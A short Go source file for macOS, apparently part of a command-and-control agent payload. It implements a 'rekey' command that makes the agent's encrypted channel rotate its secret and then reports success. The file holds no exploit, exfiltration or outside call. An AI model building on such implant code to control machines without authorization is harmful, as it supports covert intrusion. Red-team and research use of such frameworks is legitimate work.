// server/docker/payloads/TCP_Darwin/action_rekey.go
// Rekey command for TCP agent - simplified version without polling

//go:build darwin
// +build darwin

package main

import (
	"time"
)

type RotateMsg struct{}

func (c *RotateMsg) execute(ctx *OpCtx, args []string) OpResult {
	// TCP agents don't use polling like HTTPS agents
	// The rekey process for TCP agents is handled differently:
	// 1. Server sends rekey_required status
	// 2. Agent regenerates secrets using the current seed
	// 3. Both sides rotate to new secrets

	// For TCP agents, the actual secret rotation is handled by SecChan
	// after each message exchange, so this command just acknowledges the request

	if secureComms != nil {
		// Force a secret rotation
		secureComms.rotateSecret()
	}

	return OpResult{
		Output:      Succ(S5),
		EC:    0,
		Done: time.Now().Format(time.RFC3339),
	}
}
